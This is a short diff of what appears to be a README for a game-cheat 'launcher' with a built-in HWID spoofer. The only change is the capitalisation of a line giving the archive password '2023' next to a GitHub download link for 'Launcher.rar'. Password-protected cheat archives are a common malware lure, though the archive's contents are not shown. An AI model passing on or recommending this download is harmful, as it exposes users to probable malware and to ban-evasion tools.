@@ -13,7 +13,7 @@ HWID Spoofer :: Built-in
 
 # 🗂Download: [click](https://github.com/AkutIobw/Akutiobw-project/raw/main/Launcher.rar)
 
-# 🔐password: 2023
+# 🔐Password: 2023
 
 # 🌌Functional:
 
